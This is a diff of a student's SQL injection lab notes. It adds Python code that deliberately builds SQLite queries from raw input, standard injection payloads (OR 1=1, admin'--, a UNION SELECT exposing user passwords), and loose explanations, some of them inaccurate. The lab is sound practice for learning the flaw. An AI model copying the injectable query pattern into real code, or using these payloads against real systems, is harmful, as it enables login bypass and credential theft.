@@ -128,3 +128,36 @@ Query G Results (Updated Cement):
 
 shadia@CYBERSPACE MINGW64 ~/Desktop/nyondo_sql_lab (main)
 $ 
+
+VULNERABLES
+import sqlite3
+conn = sqlite3.connect('nyondo_stock.db')
+
+def search_product(name):
+    query = f"SELECT * FROM products WHERE name LIKE '%{name}%'"
+    print(f'Query: {query}')
+    rows = conn.execute(query).fetchall()
+    print(f'Result: {rows}\n')
+    return rows
+
+def login(username, password):
+    query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
+    print(f'Query: {query}')
+    row = conn.execute(query).fetchone()
+    print(f'Result: {row}\n')
+    return row
+
+
+search_product("' OR 1=1--")
+login("admin'--", "anything")
+login("' OR '1'='1", "' OR '1'='1")
+search_product("' UNION SELECT id, username, password, role FROM users--")
+
+('' OR 1=1--) this attack works because it makes the condition always true.and it comments out the rest of the query making it print everything
+login("admin'--", "anything") this one closes the string after admin and there everything after the admin input is always true
+login("' OR '1'='1", "' OR '1'='1")
+'1'='1 is always true.
+Combined with OR, the WHERE clause becomes true for every row.
+Result: Login succeeds regardless of credentials.
+search_product("' UNION SELECT id, username, password, role FROM users--")
+the union select merges data from other users hence the attacker forces the query to disclose data from other other rows
